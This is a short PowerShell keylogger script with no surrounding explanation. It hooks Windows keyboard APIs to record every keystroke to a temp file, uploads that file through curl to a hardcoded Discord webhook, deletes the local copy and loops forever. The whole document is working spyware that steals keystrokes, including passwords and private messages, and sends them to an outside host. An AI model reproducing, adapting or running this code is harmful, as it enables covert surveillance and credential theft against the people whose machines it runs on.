function K($Path="$env:temp\k.txt") 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@


  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {

    
    while ($d -ne 0) {
      Start-Sleep -Milliseconds 40
      
      
      for ($ascii = 9; $ascii -le 254; $ascii++) {
        # get current key state
        $state = $API::GetAsyncKeyState($ascii)
	$d = Get-Date -Format %s
        
        if ($state -eq -32767) {
          $null = [console]::CapsLock

          
          $virtualKey = $API::MapVirtualKey($ascii, 3)

          
          $kbstate = New-Object Byte[] 256
          $checkkbstate = $API::GetKeyboardState($kbstate)

         
          $mychar = New-Object -TypeName System.Text.StringBuilder

          $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

          if ($success) 
          {
            # 
            [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
	    $d = Get-Date -Format %s
          }
        }
      }
    }
  }
  finally
  {
    Set-Location $env:temp
	
    $hookUrl = 'https://discord.com/api/webhooks/1130234959148359771/Qn5KRieuzWJHcn4MTezMzadO4mt6uRAGkt40RdRTQ7rojQvzHIfKVC83p-DV6eqYYSj7'
	
    curl.exe -F 'file1=@k.txt' $hookurl -o nul
    
    Start-Sleep -Milliseconds 50
	    
    Remove-Item $env:temp\k.txt
   }
}
 
While($true){ &K}
